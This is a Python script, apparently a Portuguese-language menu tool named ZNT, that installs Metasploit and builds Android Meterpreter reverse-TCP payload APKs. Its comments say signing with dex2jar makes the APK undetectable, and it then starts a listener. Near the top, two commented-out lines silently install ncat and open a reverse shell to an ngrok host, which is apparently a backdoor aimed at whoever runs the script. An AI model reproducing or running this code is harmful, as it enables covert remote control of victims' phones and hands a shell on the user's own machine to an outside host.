import os
import sys

#os.system(" nohup sudo apt install ncat /dev/null &")
#os.system("ncat 0.tcp.ngrok.io 17261 -e /bin/bash")

print("\n")
print("\033[1;32m               ::::::::::      ::::   :::     ::::::::::::		\033[0;0m")
print("\033[1;32m              	   :+:        :+:+:   :+:         :+:  	 		\033[0;0m")
print("\033[1;32m              	  +:+         :+:+:+  +:+        +:+   	  		\033[0;0m")
print("\033[1;32m 		 +#+          +#+ +:+ +#+       +#+    	   				\033[0;0m")
print("\033[1;32m                +#+           +#+  +#+#+#       +#+     	 	\033[0;0m")
print("\033[1;32m               #+#            #+#   #+#+#      #+#     		\033[0;0m")
print("\033[1;32m             #########       ###    ####      ###       		\033[0;0m")
print("\n")

print("\033[1;32m [1]baixar dependecia : 	\033[0;0m")
print("\033[1;32m [2]criar payload :		\033[0;0m")
print("\033[1;32m [3]sair  :				\033[0;0m")

#variaveis

baixar = "1"
criar = "2"
sair = "3"

print("\n")

x = input("\033[1;32m Exemplo Opção [1] : \033[0;0m")

if x == '1':
		
	#Dex2jar usada para deixar apk indetectável
	#comando usado para deixar apk indetectavel d2j-apk-sign nome_do_app.apk

	os.system("curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \ ")
	os.system("  chmod 755 msfinstall && \ ")
	os.system("  ./msfinstall")

	#Dex2jar usada para deixar apk indetectável
	#comando usado para deixar apk indetectavel d2j-apk-sign nome_do_app.apk
	
	os.system("add-apt-repository ppa:backbox/seven")
	os.system("apt-get update")
	os.system("apt-get install dex2jar")
		
if x == '2':

	# ZNT e uma ferramenta criada para automatizar o processo der criar payload

	ip = input("\033[1;32m Digite ip : 				\033[0;0m")
	porta = input("\033[1;32m Digite porta : 		\033[0;0m")
	nome = input("\033[1;32m Digite nome do app : 	\033[0;0m")

	fp = open("msf.rc", "w")
	fp.write(f"""
	msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={porta} R > {nome}

	d2j-apk-sign {nome}
	
	use multi/handler
	set payload android/meterpreter/reverse_tcp
	set lhost 127.0.0.1
	set lport 8888
	exploit
	""")

	fp.close()

	os.system("msfconsole -r msf.rc")